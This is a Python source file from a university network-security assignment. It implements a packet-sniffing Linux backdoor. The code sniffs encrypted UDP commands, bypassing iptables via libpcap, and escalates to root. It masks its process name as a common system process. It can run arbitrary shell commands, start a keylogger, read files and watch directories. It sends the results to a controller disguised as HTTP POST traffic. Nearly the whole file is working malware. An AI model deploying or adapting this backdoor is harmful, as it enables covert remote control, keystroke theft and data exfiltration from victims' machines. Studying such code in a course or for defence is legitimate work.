#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
receiver.py
    - Contains a packet sniffing backdoor that listens for port-knocking on 3 ports in a specific order.
    - If port-knocking successful, decrypt the payload from the last packet and execute the command and.
      save the output. Then start a TCP connection to the sender and return the payload.
----------------------------------------------------------------------------------------------------
"""

import setproctitle
import socket as sock
# from socket import *
from _thread import *
from os import setuid, setgid
from os import path

import encryption
import utils
import textwrap
import subprocess
# watchdog imports
import sys
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
# scapy imports
from scapy.all import *
from scapy.layers.inet import *
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"
# host_address = ""


class Configuration:
    def __init__(self):
        self.receiver_address = ''
        self.sender_address = ''
        self.receiver_port = 0
        self.sender_port = 0
        self.port_knock_password_base = ''
        self.port_knock_password_seq_num = ''
        self.delimiter = ''

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            fp = [line.rstrip('\n') for line in file]
            for line in fp:
                if line.isspace() or line.startswith('#'):
                    continue

                config_data = line.split('=')
                if config_data[0] == 'receiver_address':
                    self.receiver_address = config_data[1]
                elif config_data[0] == 'sender_address':
                    self.sender_address = config_data[1]
                elif config_data[0] == 'sender_port':
                    if config_data[1].isdigit():
                        self.sender_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'receiver_port':
                    if config_data[1].isdigit():
                        self.receiver_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'port_knock_password_base':
                    self.port_knock_password_base = config_data[1]
                elif config_data[0] == 'port_knock_password_seq_num':
                    self.port_knock_password_seq_num = config_data[1]
                elif config_data[0] == 'delimiter':
                    self.delimiter = config_data[1]

    def update_port_knock_password_seq_num(self):
        self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            data = file.readlines()

        for idx, a in enumerate(data):
            if "port_knock_password_seq_num" in a:
                data[idx] = "port_knock_password_seq_num=" + str(self.port_knock_password_seq_num) + "\n"

        with open(file=CONFIGURATION_PATH, mode='w', encoding='utf-8') as file:
            file.writelines(data)


# Initialize configuration class.
config = Configuration()
# Initialize packet_list for reassembling packets in correct order.
packet_list = {}


def run_commands(command):
    """
    Executes a shell command, then save and returns the output.
    :param command: str of shell command
    :return: str of output
    """
    # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
    try:
        result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Failed to execute shell command. Shell command invalid or unknown on receiver system."
    print(result2)
    return result2


def hide_process_name():
    # Change process name to the highest duplicate process on system.
    try:
        # Gets last column of ps (process status), the process names.
        cmd1 = "ps -e -o command"
        # Gets each unique (process name), and number of duplicates
        cmd2 = "uniq -c"
        # Sort by ascending order of first field/column (num of dups).
        cmd3 = "sort -nr --key=1,1"
        # Keep the first line of output (highest dups)
        cmd4 = "head -n 1"
        # Removes the first column (# of dups)
        cmd5 = "awk '{$1=\"\"}1'"
        # Removes the leading space delimiter after cutting out first column
        cmd6 = "awk '{$1=$1}1"
        # ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=""}1' | awk '{$1=$1}1'
        get_highest_dup_process_name = "ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=\"\"}1' | awk '{$1=$1}1' "
        output = run_commands(get_highest_dup_process_name)
        setproctitle.setproctitle(output)
    except Exception:
        # If failed, default to /bin/bash as process name.
        setproctitle.setproctitle("/bin/bash")


def start_backdoor():
    """
    Initialize the packet sniffing backdoor. Elevate privileges, sets up configurations, and starts sniff.
    :return: None
    """
    print("Starting Receiver.")
    start_watching_directory("data")
    c = input()
    stop_watching_directory()
    g = input()

    # Elevate privileges.
    setuid(0)
    setgid(0)

    hide_process_name()

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    # Read Configuration
    global config
    config = Configuration()
    receiver_addr = config.receiver_address
    port1 = config.receiver_port
    port2 = config.receiver_port
    port3 = config.receiver_port
    sender_addr = config.sender_address
    sender_port = config.sender_port
    delimiter = config.delimiter

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    # Start sniffing, callback function to process each packet.
    sniff(prn=process_sniff_pkt, filter=f"udp dst port {config.receiver_port}", store=0)
    # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)


def process_sniff_pkt(pkt):
    """
    Callback function that processes each packet sniffed for valid backdoor sequence.
    UDP packets must port knock port 1-3 in config file in the right order, while also containing
    the auth_string as payload specified in config file.
    If a valid port knock is detected, decrypt command from payload to execute.
    :param pkt: scapy packet
    :return: None
    """
    global config
    global packet_list
    packet_list = {}
    packet_start = "$$!!"

    ip_dst = pkt.payload.dst

    if ip_dst != config.receiver_address:
        return

    # dst_port = pkt.payload.payload.dport
    check_data = bytes(pkt.payload.payload.payload)
    try:
        encoded_input = check_data.decode("utf-8")
    except UnicodeDecodeError:
        # print("Unauthorized Non-unicode payload for backdoor.")
        return

    data = check_data.decode("utf-8")

    # if type(check_data) == bytes:
    #     print(f"Payload: {check_data.decode('utf-8')}")
    #     data = check_data.decode('utf-8')

    if not data.startswith(packet_start):
        return

    # slice out packet_start
    s_data = data[4:]
    decrypt_cmd = ""
    commands = []
    try:
        print(f"Encrypted Cmd: {s_data}")
        decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
        print(f"Cmd: {decrypt_cmd}")
        commands = decrypt_cmd.split(config.delimiter)
    except:
        print(f"Decryption Failed:\n{decrypt_cmd}")

    print(commands)
    one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
    packet_password = commands[0]
    order = commands[1]
    print(len(commands))
    if len(commands) > 2:
        instruction = commands[2]
    if len(commands) > 3:
        instruction_input = commands[3]

    if one_time_password != packet_password:
        print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
        return
    print(f"Password Matched!\n{one_time_password}\n{packet_password}")

    if order == "1/1":
        instruction = commands[2]
        if instruction == "1":
            print(instruction)
            utils.start_keylogger()
        elif instruction == "2":
            print(instruction)
            file_path = utils.stop_keylogger()
            binary_file, file_name = get_file_binary(file_path)
            send_message(binary_file, instruction, file_name)
        elif instruction == "3":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
            result = run_commands(instruction_input)
            encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
            send_message(encrypted_data, instruction)
        elif instruction == "4":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
            binary_file, file_name = get_file_binary(instruction_input)
            send_message(binary_file, instruction, file_name)
        elif instruction == "5":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
        elif instruction == "6":
            print(instruction)
        elif instruction == "7":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
            start_watching_directory(instruction_input)
        elif instruction == "8":
            print(instruction)
            stop_watching_directory()
        elif instruction == "9":
            print(instruction)
        else:
            print(f"WARNING, invalid instruction: {instruction}.")


def get_file_binary(file_path):
    # file_name = "file_path"
    with open(file=file_path, mode='rb') as file:  # b is important -> binary
        fileContent = file.read()
        file_name = path.basename(file.name)

    # filename = "test.bmp"
    # print(f"type fileContent: {type(fileContent)}")
    file_binary = encryption.encrypt(fileContent).decode('utf-8')
    # print(f"type encrypt: {type(encryption.encrypt(fileContent))}")
    # print(f"type ef: {type(ef)}")
    # sf = encryption.decrypt(ef.encode('utf-8'))
    # print(f"type sf: {type(sf)}")
    #
    # with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
    #     file.write(sf)

    return file_binary, file_name


def send_message(message, instruction, filename=""):
    if filename != "":
        filename = encryption.encrypt(filename.encode('utf-8')).decode('utf-8')

    address = config.sender_address
    # sport = 7000
    # dport = port
    dport = config.sender_port
    # inital_seq_num = 1000

    # 3-way-handshake
    syn = IP(dst=address) / TCP(dport=dport, flags='S')
    syn_ack = sr1(syn, verbose=0, timeout=3)

    if syn_ack is None:
        syn_ack = IP(dst=config.receiver_address) /\
                  TCP(sport=syn[TCP].dport, dport=syn[TCP].sport, flags='SA', seq=syn[TCP].ack,
                      ack=syn[TCP].seq + 1)
        print("3-way-handshake failed. No response from receiver.")

    ack = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
    send(ack, verbose=0)

    request = f"POST / HTTP/1.1\r\n" \
              f"Host: 192.168.1.195\r\n" \
              f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
              f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
              f"Accept-Encoding: gzip, deflate\r\n" \
              f"Cookie:\r\n" \
              f"session_type={instruction},session_name={filename},session=0000000001\r\n" \
              f"Connection: keep-alive\r\n" \
              f"Upgrade-Insecure-Requests: 1\r\n" \
              f"Content-Type: text/html; charset=utf-8\r\n" \
              f"Content-Length: {len(message)}\r\n\r\n" + message

    # if len(request) != len(request.encode('utf-8')):
    #     print(f"len_request decoded: {len(request)}")
    #     print(f"len_request encoded: {len(request.encode('utf-8'))}")
    #     raise ValueError
    request_encoded = request.encode('utf-8')

    if len(request_encoded) <= 1400:
        http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
                                             ack=syn_ack[TCP].seq + 1) / request_encoded
        send(http_request, verbose=0)
    else:
        # ceiling division, get splits for unicode length
        total_splits = -(len(request_encoded) // -1400)

        new_request = f"POST / HTTP/1.1\r\n" \
                  f"Host: {config.sender_address}\r\n" \
                  f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
                  f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
                  f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
                  f"Accept-Encoding: gzip, deflate\r\n" \
                  f"Cookie:\r\n" \
                  f"session_type={instruction},session_name={filename},session={str(total_splits).zfill(10)}\r\n" \
                  f"Connection: keep-alive\r\n" \
                  f"Upgrade-Insecure-Requests: 1\r\n" \
                  f"Content-Type: text/html; charset=utf-8\r\n" \
                  f"Content-Length: {len(message)}\r\n\r\n" + message

        # split into even chunks in string, then convert to unicode
        split_len = -(len(request) // -total_splits)
        parts = [new_request[i: i + split_len] for i in range(0, len(new_request), split_len)]

        # num_parts = str(len(textwrap.wrap(request, 1400))).zfill(10)
        # parts = textwrap.wrap(new_request, 1400)
        current_seq = syn_ack[TCP].ack
        for idx, part in enumerate(parts):
            payload = part.encode('utf-8')
            if idx > 0:
                packet_order = f"{config.delimiter}{idx + 1}".encode('utf-8')
                payload += packet_order

            http_post = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags="PA",
                                              seq=current_seq,
                                              ack=syn_ack[TCP].seq + 1) / Raw(load=payload)
            r_ack = sr1(http_post, verbose=0, timeout=1)
            if r_ack is None:
                current_seq = syn_ack[TCP].ack + int(len(payload) * idx)
            else:
                current_seq = r_ack[TCP].ack



def on_created(event):
    print("created")

def on_modified(event):
    print("modified")
    print(event)

class OnMyWatch:
    def __init__(self, directory_path, is_recursive=True):
        self.observer = Observer()
        # Set the directory on watch
        self.watch_directory = directory_path
        self.is_recursive = is_recursive

    def set_path(self, new_path):
        self.watch_directory = new_path

    def run(self):
        # event_handler = Handler()
        event_handler = FileSystemEventHandler()
        event_handler.on_modified = on_modified
        event_handler.on_created = on_created
        self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
        self.observer.start()
        try:
            while True:
                time.sleep(5)
        except:
            self.observer.stop()
            print("Observer Stopped")

        self.observer.join()

    def stop(self):
        self.observer.stop()


class Handler(FileSystemEventHandler):

    @staticmethod
    def on_any_event(event):
        if event.is_directory:
            return None

        elif event.event_type == 'created':
            # Event is created, you can process it now
            print("Watchdog received created event - % s." % event.src_path)
            print(event.src_path)
            # binary_file, file_name = get_file_binary(event.src_path)
            # send_message(binary_file, "7", file_name)
            # "7" to match the watch a directory instruction sent by attacker
        elif event.event_type == 'modified':
            # Event is modified, you can process it now
            print("Watchdog received modified event - % s." % event.src_path)
            print(event.src_path)
            # binary_file, file_name = get_file_binary(event.src_path)
            # send_message(binary_file, "7", file_name)
            # "7" to match the watch a directory instruction sent by attacker


directory_watch_active = False
directory_path = "data"
watch = OnMyWatch(directory_path)


def start_watching_directory(new_directory_path):
    global watch
    global directory_watch_active
    global directory_path
    if directory_watch_active:
        print(f"Already watching directory {directory_path}")
        return

    directory_watch_active = True
    directory_path = new_directory_path
    watch.set_path(directory_path)

    watch.run()
    print(f"Directory watch started: {directory_path}")


def stop_watching_directory():
    global watch
    global directory_watch_active

    if not directory_watch_active:
        print("Directory watch stopped.")
        return

    watch.stop()
    directory_watch_active = False
    print(f"Directory watch stopped: {directory_path}")
    return


if __name__ == "__main__":
    try:
        start_backdoor()
    except KeyboardInterrupt as e:
        print("Receiver Shutdown")
        exit()


